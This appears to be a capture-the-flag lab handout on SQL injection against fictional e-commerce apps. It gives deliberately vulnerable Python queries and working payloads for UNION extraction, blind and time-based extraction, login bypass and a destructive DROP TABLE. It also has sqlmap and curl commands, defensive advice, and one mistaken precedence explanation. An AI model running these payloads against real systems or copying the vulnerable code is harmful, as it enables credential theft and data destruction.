# Case Study: Lab 7 - SQL Injection

## Business Context

**Company**: DataFlow E-Commerce Platform  
**Role**: Database Security Assessor  
**Date**: Q2 2024  
**Severity**: CRITICAL ⚠️

---

## Executive Summary

DataFlow's e-commerce platform directly concatenates user input into SQL queries across multiple systems: product filters, authentication flows, and data lookup services. Database queries are vulnerable to injection attacks across four different application themes.

Your task is to **identify and exploit SQL injection vulnerabilities** to extract data, bypass authentication, and demonstrate the full impact of unsanitized database queries.

---

## Business Problem

The platform was built with legacy code that concatenates user input directly into SQL:

```python
# VULNERABLE CODE
category = request.args.get('category')
query = f"SELECT * FROM products WHERE category = '{category}'"
result = db.execute(query)  # NO PARAMETERIZATION!
```

**Consequences:**
- Users can extract entire databases
- Authentication can be bypassed
- Sensitive data is exposed
- Database can be modified or deleted
- Potential for operating system command execution (depending on DB)

---

## Challenge: Lab 7.1 - SQL Injection in Catalog Filters

### Problem Statement

Four themed e-commerce applications allow users to filter products by category. Each application uses SQL queries to fetch products, but fails to properly escape user input.

---

## VARIANT 7.1 A: Basic SQL String Concatenation

### Problem Statement
The Electronics Store uses an old, simple query builder that concatenates user input directly into SQL strings. No parameterized queries, no escaping. The code literally does: `query = f"... WHERE category = '{user_input}'"`. There's no attempt at input validation. The developer assumed filtering by valid categories would prevent injection, never considering an attacker could input SQL syntax itself.

### Vulnerability Description
Direct string concatenation with zero escaping:

**Vulnerable Code:**
```python
category = request.args.get('category')
query = f"SELECT * FROM products WHERE category = '{category}'"
```

### Attack Vector
```sql
' OR '1'='1
```

### Step-by-Step Exploitation

**Step 1: Normal Request**
```
GET /products?category=Electronics
Result: Shows only Electronics products
```

**Step 2: Test Injection**
```
GET /products?category=Electronics' OR '1'='1
Query becomes: SELECT * FROM products WHERE category ='Electronics' OR '1'='1'
Result: ALL products shown (OR condition always true)
```

**Step 3: Verify Vulnerability**
```
Compare results:
- Normal: filtered results
- Injected: all products in database
```

**Step 4: Claim Flag**
```
Payload confirmed successful
Flag endpoint: /sql-success?variant=7_1a
```

### Expected Results
```json
{
  "payload": "' OR '1'='1",
  "result": "All products returned",
  "flag": "FLAG!lab7_1a_[hash]"
}
```

---

## VARIANT 7.1 B: Multi-Column Response with Visible Output

### Problem Statement
The Fashion Store has the same SQL injection vulnerability as Electronics Store, BUT the query returns multiple columns (id, name, price) that are all displayed in the response HTML. This makes UNION-based injection viable and easy. You can query any table and see the results directly in the page. The visible output is perfect for UNION attacks.

### Vulnerability Description
Vulnerable query returns 3 columns and displays all of them. UNION attack works perfectly because you see the output directly.

**Vulnerable Code:**
```python
category = request.args.get('category')
query = f"SELECT id, name, price FROM products WHERE category = '{category}'"
```

### Attack Methodology

**Step 1: Determine Column Count** 
```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
' ORDER BY 4 --  (error - too many)

Result: 3 columns
```

**Step 2: Build UNION Injection**
```sql
' UNION SELECT 1, 2, 3 --
```

**Step 3: Extract User Data**
```sql
' UNION SELECT username, password, email FROM users --
```

### Expected Results
```json
{
  "technique": "UNION-based SQL injection",
  "column_count": 3,
  "payload": "' UNION SELECT username, password, email FROM users --",
  "flag": "FLAG!lab7_1b_[hash]"
}
```

---

## VARIANT 7.1 C: Hidden Queries with Silent Error Handling

### Problem Statement
Coffee Shop has the same SQL injection vulnerable query, BUT errors are suppressed. The page only shows "Success" or "No results" based on whether the query returned rows. No error messages, no query output. This is called blind injection - you can't see data directly, you have to infer it from true/false responses (query returns rows = true, query returns nothing = false).

### Vulnerability Description
Errors are caught and silenced. Response only indicates success/failure, not data. Forces you to use boolean logic to extract information.

**Vulnerable Code:**
```python
category = request.args.get('category')
query = f"SELECT * FROM products WHERE category = '{category}'"
cursor.execute(query)
return ("Success" if cursor.rowcount > 0 else "No results")
```

### Attack Methodology

**Step 1: Demonstrate Boolean Difference**
```sql
' AND '1'='1 --  (true - returns products)
' AND '1'='2 --  (false - returns "No results")
```

**Step 2: Extract Character-by-Character**
```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE admin=1) = 'a' --
```

### Expected Results
```json
{
  "technique": "Boolean-based blind SQL injection",
  "methodology": "Character extraction via boolean conditions",
  "flag": "FLAG!lab7_1c_[hash]"
}
```

---

## VARIANT 7.1 D: Unquoted Numeric Parameter Injection

### Problem Statement
Grocery Store has a different query structure: `SELECT * FROM products WHERE id = <user_input>` with NO quotes around the numeric ID. Because there are no quotes, you don't need to break out of a string context. You can directly concatenate SQL logic. The numeric context and lack of quotes makes this slightly different exploitation than the quoted string variants.

### Vulnerability Description
Numeric parameters without quotes allow direct SQL injection without string breaking:

**Vulnerable Code:**
```python
product_id = request.args.get('id')  
query = f"SELECT * FROM products WHERE id = {product_id}"  # No quotes!
```

### Attack Vector
```sql
1 OR 1=1
-1 UNION SELECT 1, username, password FROM users --
```

### Expected Results
```json
{
  "technique": "Integer-based UNION SQL injection",
  "vulnerable_parameter": "id (numeric, no quotes)",
  "payload": "-1 UNION SELECT 1, CONCAT(username,':',password), email FROM users --",
  "flag": "FLAG!lab7_1d_[hash]"
}
```

---

## Challenge: Lab 7.2 - SQL Injection in Authentication

### Problem Statement

The login form concatenates username and password directly into authentication queries:

```python
# VULNERABLE
username = request.form.get('username')
password = request.form.get('password')
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
user = db.execute(query).fetchone()
```

---

## VARIANT 7.2 A: Authentication Logic Bypass via OR Precedence

### Problem Statement
The login form has injectable username and password fields in a query like: `SELECT * FROM users WHERE username='X' AND password='Y'`. Both fields are vulnerable to injection. By injecting in the username field as `admin' OR '1'='1`, you exploit operator precedence. The OR condition has higher priority than AND, so it becomes `(username='admin') OR ('1'='1' AND password='...')` - the first condition is true regardless of password.

### Vulnerability Description
Operator precedence allows OR to bypass the AND check:

### Attack Vector
```
Username: admin' OR '1'='1
Password: anything
```

### Expected Results
```json
{
  "technique": "OR-based authentication bypass",
  "payload": "admin' OR '1'='1",
  "result": "Admin authenticated without password",
  "flag": "FLAG!lab7_2a_[hash]"
}
```

---

## VARIANT 7.2 B: Comment Injection for Password Elimination

### Problem Statement
The login form accepts username injection. Using the SQL comment syntax `--`, you can comment out everything after your injection, including the password check. Inject as `admin' --` and the query becomes: `SELECT * FROM users WHERE username='admin' -- AND password='...'` where everything after the comment is ignored. The password check is removed entirely.

### Vulnerability Description
SQL comment syntax removes the entire password validation:

### Attack Vector
```
Username: admin' --
Password: (anything)

Query becomes:
SELECT * FROM users WHERE username='admin' -- AND password='...'
Password check completely commented out!
```

### Expected Results
```json
{
  "technique": "Comment-based authentication bypass",
  "payload": "admin' --",
  "bypass_mechanism": "Password check commented out",
  "password_check": "Ignored",
  "flag": "FLAG!lab7_2b_[hash]"
}
```

---

## VARIANT 7.2 C: Post-Authentication Injection in Admin Panel

### Problem Statement
Typically after you bypass authentication (Variant A or B), you just get logged in. That seems like victory. But the admin panel ITSELF has additional SQL injection vulnerabilities in search/filter fields that are only accessible after authentication. Developers never expected anyone to bypass login, so they didn't secure the admin panel itself. By first bypassing authentication, then exploiting injection in admin features, you gain escalated data access.

### Vulnerability Description
Two-stage attack: First bypass auth, then exploit admin panel injection

2. Application 2: Comment bypass
   ```
   Username: admin' --
   Password: (anything)
   ```

3. Application 3: Specialized payload
   - Analyze error messages
   - Adjust payload based on feedback
   - Try different comment styles (-- vs #)

**Objective 3: Extract Admin Credentials**
- After bypassing, extract actual usernames/hashes
- Demonstrate full vulnerability chain
- Retrieve flag

---

## Challenge: Lab 7.3 - Time-Based Blind SQL Injection

### Problem Statement

Some applications don't return error messages or data directly. Instead, you force the database to perform actions based on true/false conditions:

**Attack Concept:**
```python
# If condition is TRUE, sleep for 5 seconds
SELECT * FROM users WHERE username='admin' AND (SLEEP(5) OR 1=0) --

# If condition is FALSE, no delay
SELECT * FROM users WHERE username='admin' AND (SLEEP(5) OR 1=1) --
```

### Your Objectives:

**Objective 1: Detect Blind Injection Vulnerability**
1. Craft payload with SLEEP() function
2. Measure response time
3. Confirm time-based injection works

**Objective 2: Extract Data Bit-by-Bit**
```sql
SELECT * FROM users WHERE id=1 AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --
```

**Objective 3: Full Data Extraction (Automated)**
- Write script to extract password character by character
- Use timing side-channel to determine correct characters
- Retrieve full credentials
- Claim flag

---

## General SQL Injection Exploitation Guide

### Step 1: Identify Injection Points
```
Test every user input:
- URL parameters: ?category=test
- Form fields: username, comment
- Headers: User-Agent, Referer
- Cookies

Injection markers:
- ' (single quote)
- " (double quote)
- ) (closing parenthesis)
- ; (statement terminator)
```

### Step 2: Detect the Vulnerability
```
Payloads to test:
1. Basic: ' OR '1'='1
2. Comment: ' OR 1=1 --
3. Extended: ' OR 1=1 /*
4. Stacked: '; DROP TABLE users --

Observe:
- Error messages (database type)
- Unexpected results (logic bypass)
- Page behavior changes (blind injection)
- Response time (time-based)
```

### Step 3: Determine Query Structure
```
For filtering queries:
SELECT * FROM [table] WHERE [column] = '[user_input]'

Test with:
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
[Stop when you get an error - that's column count - 1]
```

### Step 4: Extract Data Using UNION

**Determine column count:**
```sql
' UNION SELECT NULL, NULL, NULL --
[Adjust NULL count until no error]
```

**Identify which columns are returned:**
```sql
' UNION SELECT 1, 2, 3 --
[See which numbers appear in output]
```

**Extract table names:**
```sql
' UNION SELECT table_name, 2, 3 FROM information_schema.tables --
```

**Extract column names:**
```sql
' UNION SELECT column_name, 2, 3 FROM information_schema.columns 
WHERE table_name='users' --
```

**Extract data:**
```sql
' UNION SELECT username, password, email FROM users --
```

### Step 5: Advanced Techniques

**Stacked Queries (if supported):**
```sql
'; UPDATE users SET admin=1 WHERE username='attacker'; --
```

**Time-Based Blind:**
```sql
' AND IF(1=1, SLEEP(5), 0) --
[5-second delay = TRUE condition]

' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --
[Extract password character by character]
```

**Error-Based Extraction:**
```sql
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT 
password FROM users LIMIT 1), FLOOR(RAND(0)*2))) AS x 
GROUP BY x) --
```

---

## Detection & Exploitation Tools

### Manual Testing with Curl
```bash
# Test basic injection
curl "http://target/products?category=Electronics' OR '1'='1"

# Test UNION injection
curl "http://target/products?category=' UNION SELECT 1,2,3 --"

# Test time-based
curl "http://target/login" --data "username=admin' AND SLEEP(5) --&password=x"
```

### SQLMap (Automated Scanner)
```bash
# Scan for SQL injection
sqlmap -u "http://target/products?category=test" --batch

# Specific parameter
sqlmap -u "http://target/products?category=test" -p category

# Dump database
sqlmap -u "http://target/products?category=test" --dump
```

### Manual with Burp Suite
1. Send request to Intruder
2. Set injection points: `category=*test*`
3. Create payload set:
   ```
   Electronics' OR '1'='1
   Electronics' UNION SELECT 1,2,3 --
   Electronics' AND SLEEP(5) --
   ```
4. Observe responses for successful injection

---

## What You Should Discover

### Lab 7.1 Expected Findings:
```json
{
  "Application A": {
    "technique": "OR-based injection",
    "payload": "Electronics' OR '1'='1",
    "result": "All products returned",
    "flag": "FLAG!lab7_1a_[hash]"
  },
  "Application B": {
    "technique": "UNION-SELECT extraction",
    "column_count": 3,
    "payload": "Electronics' UNION SELECT id, username, email FROM users --",
    "extracted_data": "All users with emails",
    "flag": "FLAG!lab7_1b_[hash]"
  },
  "Application C": {
    "technique": "Boolean blind injection",
    "methodology": "Extract via TRUE/FALSE differences",
    "flag": "FLAG!lab7_1c_[hash]"
  },
  "Application D": {
    "technique": "Integer injection",
    "payload": "1 OR 1=1",
    "result": "Returns all products",
    "flag": "FLAG!lab7_1d_[hash]"
  }
}
```

### Lab 7.2 Expected Findings:
```json
{
  "Application 1": {
    "type": "Simple OR bypass",
    "payload": "username: admin' OR '1'='1",
    "result": "Authentication bypassed",
    "flag": "FLAG!lab7_2a_[hash]"
  },
  "Application 2": {
    "type": "Comment-based bypass",
    "payload": "username: admin' --",
    "result": "Password check ignored",
    "flag": "FLAG!lab7_2b_[hash]"
  },
  "Application 3": {
    "type": "Data extraction after bypass",
    "extracted_credentials": "username:password_hash",
    "flag": "FLAG!lab7_2c_[hash]"
  }
}
```

### Lab 7.3 Expected Findings:
```json
{
  "technique": "Time-based blind SQL injection",
  "detection": "SLEEP(5) payload causes 5-second delay",
  "data_extraction": "Character-by-character via timing",
  "example_result": "admin password extracted as: a,b,c,123...",
  "flag": "FLAG!lab7_3_[hash]"
}
```

---

## Technical Concepts

### SQL Injection Attack Categories

**1. In-Band (Union-Based)**
```
Attacker sees results directly
Fastest exploitation method
Requires knowing column count
```

**2. Blind (Boolean-Based)**
```
No direct results visible
Infer data through TRUE/FALSE behavior
Slow but always works
```

**3. Time-Based Blind**
```
Measure response timing
TRUE conditions cause delays
Extraction character by character
Very slow but reliable
```

**4. Error-Based**
```
Force database errors
Error message contains data
Requires verbose error messages
```

---

## SQL Injection Syntax by Database

### MySQL
```sql
-- Comment syntax: -- and #
UNION SELECT: Requires UNION key
SLEEP(5): Time-based blind
Information schema: information_schema.tables
```

### PostgreSQL
```sql
-- Comment syntax: --
UNION SELECT: Requires UNION ALL
pg_sleep(5): Time-based blind
System catalog: information_schema
```

### MSSQL
```sql
-- Comment syntax: --
UNION SELECT: Works with UNION ALL
WAITFOR DELAY: Time-based blind
System tables: sysobjects, syscolumns
```

---

## Exploitation Workflow

```
1. Identify vulnerable parameter
   ↓
2. Test SQL syntax (error-based)
   ↓
3. Determine query structure
   ↓
4. Choose exploitation method:
   - UNION if data visible
   - Blind if no data
   - Time-based if all else fails
   ↓
5. Extract sensitive data
   - Table names
   - Column names
   - User credentials
   - Configuration data
   ↓
6. Escalate privileges/access
   - Modify data
   - Create admin accounts
   - Potential RCE
   ↓
7. Claim flag
```

---

## Flag Submission Checklist

- [ ] Identified SQL injection point (parameter)
- [ ] Confirmed vulnerability with test payload
- [ ] Extracted data using appropriate technique
- [ ] Retrieved flag for each application
- [ ] Documented exploitation methodology
- [ ] Submitted all flags to platform

---

## Real-World Impact

**Successful SQL injection allows:**
- Extract all customer data (PII, payment info)
- Bypass authentication and access admin panels
- Modify prices, orders, user accounts
- Delete entire databases
- Install web shells for persistence
- Access operating system (with DB privileges)
- Complete business compromise

**Notable real-world breaches:**
- Millions of user records stolen
- Financial fraud and identity theft
- Regulatory fines (GDPR, PCI-DSS)
- Reputational damage
- Loss of customer trust

---

## Defense Strategies (Learn These!)

### ✅ Prepared Statements / Parameterized Queries
```python
# SECURE
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", 
               (username, password))
```

### ✅ Input Validation & Whitelist
```python
# Validate expected input
allowed_categories = ['Electronics', 'Clothing', 'Books']
if category not in allowed_categories:
    raise ValueError("Invalid category")
```

### ✅ ORM Frameworks
```python
# Django ORM prevents SQL injection
User.objects.filter(username=username, password=password)
```

### ✅ Web Application Firewall (WAF)
- Monitor for SQL injection patterns
- Block suspicious queries
- Rate limit suspicious traffic

### ✅ Least Privilege
- Database user only has SELECT on needed tables
- No DROP, ALTER, or EXEC privileges
- Separate read-only and write credentials

---

## Key Takeaways

1. **Never concatenate user input into SQL** - Always use prepared statements
2. **Whitelist > Blacklist** - Only allow known-good input
3. **Principle of least privilege** - Limit database account permissions
4. **Input validation + output encoding** - Defense in depth
5. **Monitor database activity** - Log suspicious queries
6. **Test during development** - Use security-focused testing
7. **Update frameworks** - Keep ORMs and libraries current

---

## Related Concepts

- **CWE-89**: SQL Injection
- **OWASP A03:2021**: Injection
- **OWASP SSTI**: Server-Side Template Injection (similar concept)
- **CVE Database**: Search "SQL Injection" for real-world examples

---

**Document your findings thoroughly. Include query structure, exploitation techniques, and extracted data.**
